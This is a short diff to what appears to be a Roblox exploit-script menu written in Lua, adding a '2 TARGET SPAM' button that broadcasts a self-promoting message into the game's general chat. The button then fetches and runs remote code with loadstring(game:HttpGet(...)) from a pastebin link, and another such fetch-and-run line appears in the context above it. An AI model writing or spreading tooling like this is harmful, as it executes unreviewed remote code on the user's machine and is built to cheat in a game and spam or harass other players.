@@ -2175,8 +2175,22 @@ loadstring(game:HttpGet("https://pastebin.com/raw/uyiHJZLs"))()end)
 
 
 btn("2 TARGET SPAM 😤💢",P5,function()
-	
-loadstring(game:HttpGet(""))()end)
+local message = "SCRIPT BY " .. playerName
+    .. " _______//_______//______💀🎀_______//______//______"
+    .. "MADE BY " .. playerName
+    .. "_________________2 TARGET SPAM LOADED 💀🔥..."
+
+local channel = game:GetService("TextChatService")
+    :FindFirstChild("TextChannels")
+
+channel = channel and channel:FindFirstChild("RBXGeneral")
+
+if channel then
+    pcall(function()
+        channel:SendAsync(message)
+    end)
+		end	
+loadstring(game:HttpGet("https://pastebin.com/raw/T71436Kd"))()end)
 
 btn("ROAST SPAM 💢🤬",P5,function()
 local message = "SCRIPT BY " .. playerName
